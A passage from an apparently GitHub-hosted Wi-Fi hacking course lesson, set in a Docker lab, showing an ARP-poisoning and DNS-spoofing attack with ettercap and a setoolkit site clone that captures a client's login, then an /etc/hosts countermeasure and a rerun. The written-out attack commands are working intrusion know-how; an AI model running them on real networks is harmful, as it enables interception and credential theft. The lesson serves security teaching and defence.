**Client (connects using the domain simulated as commonly used, `carlos.web.com`):**
```bash
docker-compose exec client-1 bash
wget carlos.web.com
tail -n 10 index.html
curl -X POST -d "username=carlos&password=passw0rd1234" http://carlos.web.com/login
```
![image](https://github.com/user-attachments/assets/9c466e5e-1d1f-4ea5-a2e4-58c66355c3ae)

This launches the attack that redirects the legitimate user `10.5.2.130`, who intends to access `carlos.web.com` (which resolves to IP `10.5.0.20`) as they normally would through the DNS service, toward the service cloning it on the attacker’s machine, allowing the theft of the credentials entered by the redirected legitimate user. Again, this shows an attack that compromises the credentials of those connected within the same network (same gateway). This is especially dangerous because the attacker is inside the internal network, meaning that this kind of authentication may happen against a corporate server, whether external or internal, which may store highly sensitive information that could endanger the company if a malicious user obtains those access credentials and therefore access to that site. Or it may simply be a strategy to create a database of corporate credentials that can be sold for a good price on the black market.

#### Countermeasures and Recommendations
The main way to stop this type of attack is to prevent an external user from gaining access to the company’s wireless access point, as will be shown with the following Wi-Fi security protocols, more robust than the recently studied ([WEP](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WEP)). 

However, there is a small strategy that can be followed to mitigate these problems, which consists of storing sensitive domains (for example, corporate websites) in the `/etc/hosts` file, which acts as a local cache. In this way, the user does not need to make a DNS request that an attacker can intercept and modify through a MITM process. To achieve this, simply uncomment on the clients (client-1, client-2, client-3) the line `10.5.0.20      carlos.web.com` that creates an entry for the current case, so that the first DNS lookup is local, invisible, and impossible for the attacker to intercept:
```bash
docker-compose exec client-1 bash
nano /etc/hosts
```
Launching the attack again from 
```bash
docker-compose exec attacker-1 bash
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
setoolkit
```
```bash
# Another terminal
# Configure the files again if the lab was restarted
nano /etc/ettercap/etter.conf
nano /etc/ettercap/etter.dns

# Enable forwarding and launch the attack
echo 1 > /proc/sys/net/ipv4/ip_forward
ettercap -T -q -P dns_spoof -M arp:remote /10.5.2.129// /10.5.2.130//
```

**Attacker:**
![image](https://github.com/user-attachments/assets/64e818a9-dbd1-40fd-bef2-aa97937d202f)
![image](https://github.com/user-attachments/assets/2724b8bc-7c30-44df-bdcd-13d56d0f1d24)

**Client:**
```bash
docker-compose exec client-1 bash
wget carlos.web.com
tail -n 10 index.html
curl -X POST -d "username=carlos&password=passw0rd1234" http://carlos.web.com/login
```
![image](https://github.com/user-attachments/assets/b47a2e2a-3d45-4dca-856f-32ad53141ba9)
![image](https://github.com/user-attachments/assets/7e900b00-2462-426c-8d66-92b47c837a69)

Now it can be seen how this attack is no longer possible thanks to this local cache, although it is still possible to see the credentials in the Ettercap console thanks to the MITM due to the lack of encryption.

[`Back to the introduction`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/main)
[`Next lesson, cracking WPA/WPA2 PSK networks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-PSK)
